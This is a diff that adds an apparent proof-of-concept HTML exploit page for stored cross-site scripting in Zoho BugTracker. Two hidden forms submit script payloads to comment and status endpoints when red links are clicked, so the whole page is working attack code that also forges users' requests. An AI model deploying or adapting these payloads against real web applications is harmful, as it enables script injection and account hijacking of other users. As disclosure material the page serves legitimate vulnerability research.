@@ -1,0 +1,34 @@
+<html>
+<title>Zoho BugTracker Multiple Stored XSS Vulnerabilities</title>
+<body bgcolor="#000000">
+<script type="text/javascript">
+function xss1(){document.forms["xss1"].submit();}
+function xss2(){document.forms["xss2"].submit();}
+</script>
+
+<form action="https://www.example.com/portal/[USER]/bugdetails.do?action=addcomment" enctype="application/x-www-form-urlencoded" method="POST" id="xss1">
+<input type="hidden" name="action" value="addcomment" />
+<input type="hidden" name="projId" value="478405000000013273" />
+<input type="hidden" name="issueId" value="478405000000013347" />
+<input type="hidden" name="zpcp" value="1f91d0fa-9a61-4aab-898c-f023ac4c44fc" />
+<input type="hidden" name="fromPage" value="bugcomments" />
+<input type="hidden" name="comment" value='"><script>alert(1);</script>' />
+<input type="hidden" name="uploadfile" value="" />
+</form>
+
+<form action="https://www.example.com/portal/[USER]/addmystatus.do" enctype="application/x-www-form-urlencoded" method="POST" id="xss2">
+<input type="hidden" name="mystatus" value='"><script>alert(2);</script>' />
+<input type="hidden" name="projId" value="478405000000013273" />
+<input type="hidden" name="targetid" value="latestactivity" />
+<input type="hidden" name="zpcp" value="1f91d0fa-9a61-4aab-898c-f023ac4c44fc" />
+</form><center>
+
+<a href="javascript: xss1();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 1</h3></font></b></a><br />
+
+<a href="javascript: xss2();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 2</h3></font></b></a><br />
+
+</center></body>
+</html>
+
